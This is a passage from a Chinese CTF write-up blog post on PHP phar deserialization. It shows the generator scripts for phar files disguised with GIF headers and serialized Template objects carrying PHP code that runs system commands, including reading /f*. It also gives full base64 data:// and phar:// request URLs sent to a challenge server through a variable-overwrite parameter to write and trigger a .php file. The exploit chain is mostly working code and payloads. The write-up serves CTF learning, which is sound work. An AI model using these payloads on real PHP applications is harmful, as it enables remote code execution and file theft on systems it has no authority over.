class="hljs-string">&quot;test&quot;</span>); <span class="hljs-comment">//添加要压缩的文件</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();  <br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure>

<p>这样执行成功后会在本地生成一个phar的文件</p>
<p>然后我们读取里面的信息</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$ph</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;phar.phar&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$ph</span>.<span class="hljs-string">&quot;\n&quot;</span>;   <span class="hljs-comment">//很多乱码 所以用base64加密一下</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$ph</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>out：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">GIF89a<span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">__HALT_COMPILER</span>(); <span class="hljs-meta">?&gt;</span><br>�fO:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;Template&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;content&quot;</span>;s:<span class="hljs-number">21</span>:<span class="hljs-string">&quot;&lt;?php system(&#x27;ls&#x27;);?&gt;&quot;</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;pattern&quot;</span>;N;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;suffix&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;.php&quot;</span>;&#125;test.txty�d~ضtest�jKn<span class="hljs-string">&#x27; Ii�Fi۶� ޅF�GBMB</span><br><span class="hljs-string">R0lGODlhPD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8+DQqcAAAAAQAAABEAAAABAAAAAABmAAAATzo4OiJUZW1wbGF0ZSI6Mzp7czo3OiJjb250ZW50IjtzOjIxOiI8P3BocCBzeXN0ZW0oJ2xzJyk7Pz4iO3M6NzoicGF0dGVybiI7TjtzOjY6InN1ZmZpeCI7czo0OiIucGhwIjt9CAAAAHRlc3QudHh0BAAAAHkXuWQEAAAADH5/2LYBAAAAAAAAdGVzdOpqS24nIEkYaaBGadu2kiDehUaeAgAAAEdCTUI=</span><br></code></pre></td></tr></table></figure>

<p>data读取：</p>
<p>​<code>data://text/plain;base64,R0lGODlhPD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8+DQqcAAAAAQAAABEAAAABAAAAAABmAAAATzo4OiJUZW1wbGF0ZSI6Mzp7czo3OiJjb250ZW50IjtzOjIxOiI8P3BocCBzeXN0ZW0oJ2xzJyk7Pz4iO3M6NzoicGF0dGVybiI7TjtzOjY6InN1ZmZpeCI7czo0OiIucGhwIjt9CAAAAHRlc3QudHh0BAAAAHkXuWQEAAAADH5/2LYBAAAAAAAAdGVzdOpqS24nIEkYaaBGadu2kiDehUaeAgAAAEdCTUI=</code>​</p>
<p>那么现在我们如何让题目所在服务器读取我们的data？可以回想到该题目的第一个界面</p>
<p>我们使用<strong>变量覆盖的方法读取</strong>内容 ！！注意嗷 一定要url编码一下哈</p>
<p>​<code>http://122.114.252.87:1120/?var[template][tp1]=data%3A%2F%2Ftext%2Fplain%3Bbase64%2CR0lGODlhPD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8%2BDQqcAAAAAQAAABEAAAABAAAAAABmAAAATzo4OiJUZW1wbGF0ZSI6Mzp7czo3OiJjb250ZW50IjtzOjIxOiI8P3BocCBzeXN0ZW0oJ2xzJyk7Pz4iO3M6NzoicGF0dGVybiI7TjtzOjY6InN1ZmZpeCI7czo0OiIucGhwIjt9CAAAAHRlc3QudHh0BAAAAHkXuWQEAAAADH5%2F2LYBAAAAAAAAdGVzdOpqS24nIEkYaaBGadu2kiDehUaeAgAAAEdCTUI%3D&amp;tp=tp1</code>​</p>
<p><img src="/.com//17476582446048249458991917343755-20250519203725-ec9ermw.png" srcset="/image/loading.gif" lazyload alt="17476582446048249458991917343755"></p>
<p>写入成功</p>
<p><img src="/.com//17476582583645402199081299806411-20250519203739-x9hipvl.png" srcset="/image/loading.gif" lazyload alt="17476582583645402199081299806411"></p>
<p><strong>触发phar：</strong></p>
<p>​<code>phar:///var/www/html/uploads/7cddc639132e5953bf969cc3c9b08fd7/6c50d8d7eaa92dc4998351838da62dcc.html</code>​继续使用刚刚的file_get_contents函数加变量覆盖进行读取</p>
<p>​<code>http://122.114.252.87:1120/?var[template][tp1]=phar%3A%2F%2F%2Fvar%2Fwww%2Fhtml%2Fuploads%2F7cddc639132e5953bf969cc3c9b08fd7%2F6c50d8d7eaa92dc4998351838da62dcc.html&amp;tp=tp1</code><img src="/.com//17476582766138360737958902537856-20250519203759-qo996jy.png" srcset="/image/loading.gif" lazyload alt="17476582766138360737958902537856"></p>
<p>执行成功 成功获得php后缀</p>
<p>因为我的命令是ls 所以访问后结果是列出的内容</p>
<p><strong>测试phpinfo</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Template</span></span>&#123;<br>	<span class="hljs-keyword">public</span> <span class="hljs-variable">$content</span> = <span class="hljs-string">&quot;&lt;?php phpinfo();?&gt;&quot;</span>;<br>	<span class="hljs-keyword">public</span> <span class="hljs-variable">$pattern</span>;<br>	<span class="hljs-keyword">public</span> <span class="hljs-variable">$suffix</span> = <span class="hljs-string">&quot;.php&quot;</span>;<br><br>&#125;<br><span class="hljs-variable">$o</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Template</span>();<br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;GIF89a&quot;</span>.<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="hljs-comment">//设置stub，增加gif文件头</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$o</span>); <span class="hljs-comment">//将自定义meta-data存入manifest</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>); <span class="hljs-comment">//添加要压缩的文件</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();  <br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="http://122.114.252.87:1120/?var%5Btemplate%5D%5Btp1%5D=data://text/plain;base64,R0lGODlhPD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8+DQqZAAAAAQAAABEAAAABAAAAAABjAAAATzo4OiJUZW1wbGF0ZSI6Mzp7czo3OiJjb250ZW50IjtzOjE4OiI8P3BocCBwaHBpbmZvKCk7Pz4iO3M6NzoicGF0dGVybiI7TjtzOjY6InN1ZmZpeCI7czo0OiIucGhwIjt9CAAAAHRlc3QudHh0BAAAALoiuWQEAAAADH5/2LYBAAAAAAAAdGVzdPzuNzRrPw2POwCmprLd6Oy5KqEDAgAAAEdCTUI=&tp=tp1">http://122.114.252.87:1120/?var[template][tp1]=data://text/plain;base64,R0lGODlhPD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8+DQqZAAAAAQAAABEAAAABAAAAAABjAAAATzo4OiJUZW1wbGF0ZSI6Mzp7czo3OiJjb250ZW50IjtzOjE4OiI8P3BocCBwaHBpbmZvKCk7Pz4iO3M6NzoicGF0dGVybiI7TjtzOjY6InN1ZmZpeCI7czo0OiIucGhwIjt9CAAAAHRlc3QudHh0BAAAALoiuWQEAAAADH5/2LYBAAAAAAAAdGVzdPzuNzRrPw2POwCmprLd6Oy5KqEDAgAAAEdCTUI=&amp;tp=tp1</a></p>
<p>&#x2F;var&#x2F;www&#x2F;html&#x2F;uploads&#x2F;7cddc639132e5953bf969cc3c9b08fd7&#x2F;2d867d52da656654f238ad3f2eceda1d.html</p>
<p><a target="_blank" rel="noopener" href="http://122.114.252.87:1120/?var%5Btemplate%5D%5Btp1%5D=phar:///var/www/html/uploads/7cddc639132e5953bf969cc3c9b08fd7/2d867d52da656654f238ad3f2eceda1d.html&tp=tp1">http://122.114.252.87:1120/?var[template][tp1]=phar:///var/www/html/uploads/7cddc639132e5953bf969cc3c9b08fd7/2d867d52da656654f238ad3f2eceda1d.html&amp;tp=tp1</a></p>
<p><img src="/.com//1747658344956718479055138235582-20250519203906-jvepfqt.png" srcset="/image/loading.gif" lazyload alt="1747658344956718479055138235582"></p>
<p><strong>测试根目录</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Template</span></span>&#123;<br>	<span class="hljs-keyword">public</span> <span class="hljs-variable">$content</span> = <span class="hljs-string">&quot;&lt;?php system(&#x27;ls /&#x27;);?&gt;&quot;</span>;<br>	<span class="hljs-keyword">public</span> <span class="hljs-variable">$pattern</span>;<br>	<span class="hljs-keyword">public</span> <span class="hljs-variable">$suffix</span> = <span class="hljs-string">&quot;.php&quot;</span>;<br><br>&#125;<br><span class="hljs-variable">$o</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Template</span>();<br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;GIF89a&quot;</span>.<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="hljs-comment">//设置stub，增加gif文件头</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$o</span>); <span class="hljs-comment">//将自定义meta-data存入manifest</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>); <span class="hljs-comment">//添加要压缩的文件</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();  <br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="http://122.114.252.87:1120/?var%5Btemplate%5D%5Btp1%5D=data://text/plain;base64,R0lGODlhPD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8+DQqeAAAAAQAAABEAAAABAAAAAABoAAAATzo4OiJUZW1wbGF0ZSI6Mzp7czo3OiJjb250ZW50IjtzOjIzOiI8P3BocCBzeXN0ZW0oJ2xzIC8nKTs/PiI7czo3OiJwYXR0ZXJuIjtOO3M6Njoic3VmZml4IjtzOjQ6Ii5waHAiO30IAAAAdGVzdC50eHQEAAAA3yO5ZAQAAAAMfn/YtgEAAAAAAAB0ZXN0ytJDUfSL2VfkbJ2LEtfOtvBCIMUCAAAAR0JNQg==&tp=tp1">http://122.114.252.87:1120/?var[template][tp1]=data://text/plain;base64,R0lGODlhPD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8+DQqeAAAAAQAAABEAAAABAAAAAABoAAAATzo4OiJUZW1wbGF0ZSI6Mzp7czo3OiJjb250ZW50IjtzOjIzOiI8P3BocCBzeXN0ZW0oJ2xzIC8nKTs/PiI7czo3OiJwYXR0ZXJuIjtOO3M6Njoic3VmZml4IjtzOjQ6Ii5waHAiO30IAAAAdGVzdC50eHQEAAAA3yO5ZAQAAAAMfn/YtgEAAAAAAAB0ZXN0ytJDUfSL2VfkbJ2LEtfOtvBCIMUCAAAAR0JNQg==&amp;tp=tp1</a></p>
<p>&#x2F;var&#x2F;www&#x2F;html&#x2F;uploads&#x2F;7cddc639132e5953bf969cc3c9b08fd7&#x2F;ed5cb36b19cdb7f89f98caaa83efda37.html</p>
<p><a target="_blank" rel="noopener" href="http://122.114.252.87:1120/?var%5Btemplate%5D%5Btp1%5D=phar:///var/www/html/uploads/7cddc639132e5953bf969cc3c9b08fd7/ed5cb36b19cdb7f89f98caaa83efda37.html&tp=tp1">http://122.114.252.87:1120/?var[template][tp1]=phar:///var/www/html/uploads/7cddc639132e5953bf969cc3c9b08fd7/ed5cb36b19cdb7f89f98caaa83efda37.html&amp;tp=tp1</a></p>
<p><img src="/.com//17476583692577796986138384772586-20250519203930-ih4wpf3.png" srcset="/image/loading.gif" lazyload alt="17476583692577796986138384772586"></p>
<p><strong>获取flag</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Template</span></span>&#123;<br>	<span class="hljs-keyword">public</span> <span class="hljs-variable">$content</span> = <span class="hljs-string">&quot;&lt;?php system(&#x27;cat /f*&#x27;);?&gt;&quot;</span>;<br>	<span class="hljs-keyword">public</span> <span class="hljs-variable">$pattern</span>;<br>	<span class="hljs-keyword">public</span> <span class="hljs-variable">$suffix</span> = <span class="hljs-string">&quot;.php&quot;</span>;<br><br>&#125;<br><span class="hljs-variable">$o</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Template</span>();<br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;GIF89a&quot;</span>.<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="hljs-comment">//设置stub，增加gif文件头</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$o</span>); <span class="hljs-comment">//将自定义meta-data存入manifest</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>); <span class="hljs-comment">//添加要压缩的文件</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();  <br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="http://122.114.252.87:1120/?var%5Btemplate%5D%5Btp1%5D=data://text/plain;base64,R0lGODlhPD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8+DQqjAAAAAQAAABEAAAABAAAAAABtAAAATzo4OiJUZW1wbGF0ZSI6Mzp7czo3OiJjb250ZW50IjtzOjI4OiI8P3BocCBzeXN0ZW0oJ2NhdCAvZmxhZycpOz8+IjtzOjc6InBhdHRlcm4iO047czo2OiJzdWZmaXgiO3M6NDoiLnBocCI7fQgAAAB0ZXN0LnR4dAQAAAB1JblkBAAAAAx+f9i2AQAAAAAAAHRlc3QyIp89T4AF5NafJYGx4f8/1grOagIAAABHQk1C&tp=tp1">http://122.114.252.87:1120/?var[template][tp1]=data://text/plain;base64,R0lGODlhPD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8+DQqjAAAAAQAAABEAAAABAAAAAABtAAAATzo4OiJUZW1wbGF0ZSI6Mzp7czo3OiJjb250ZW50IjtzOjI4OiI8P3BocCBzeXN0ZW0oJ2NhdCAvZmxhZycpOz8+IjtzOjc6InBhdHRlcm4iO047czo2OiJzdWZmaXgiO3M6NDoiLnBocCI7fQgAAAB0ZXN0LnR4dAQAAAB1JblkBAAAAAx+f9i2AQAAAAAAAHRlc3QyIp89T4AF5NafJYGx4f8/1grOagIAAABHQk1C&amp;tp=tp1</a></p>
<p>&#x2F;var&#x2F;www&#x2F;html&#x2F;uploads&#x2F;7cddc639132e5953bf969cc3c9b08fd7&#x2F;50d6dc5cc571407544cd2bff51338b7e.html</p>
<p><a target="_blank" rel="noopener" href="http://122.114.252.87:1120/?var%5Btemplate%5D%5Btp1%5D=phar:///var/www/html/uploads/7cddc639132e5953bf969cc3c9b08fd7/50d6dc5cc571407544cd2bff51338b7e.html&tp=tp1">http://122.114.252.87:1120/?var[template][tp1]=phar:///var/www/html/uploads/7cddc639132e5953bf969cc3c9b08fd7/50d6dc5cc571407544cd2bff51338b7e.html&amp;tp=tp1</a></p>
<p>步骤是对的可能没有写flag嘿嘿 到此结束！</p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/Web%E5%AE%89%E5%85%A8/" class="category-chain-item">Web安全</a>
  
  
    <span>></span>
    
  <a href="/categories/Web%E5%AE%89%E5%85%A8/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="category-chain-item">注入漏洞</a>
  
  
    <span>></span>
    
  <a href="/categories/Web%E5%AE%89%E5%85%A8/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="category-chain-item">反序列化</a>
  
  

  

  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/PHP/" class="print-no-link">#PHP</a>
      
        <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="print-no-link">#反序列化</a>
      
        <a href="/tags/CTF%E9%A2%98%E7%9B%AE/" class="print-no-link">#CTF题目</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>反序列化题目练习</div>
      <div>http://example.com/2024/05/20/Web/注入漏洞/反序列化/反序列化详解/题目练习/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>John Doe</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2024年5月20日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-cc-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2024/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3/%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5/" title="反序列化对象注入">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">反序列化对象注入</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2024/04/25/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SSTI%EF%BC%88%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%EF%BC%89/SSTI%E5%89%8D%E7%AF%87/" title="SSTI前篇">
                        <span class="hidden-mobile">SSTI前篇</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="/js/jquery.min.js/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
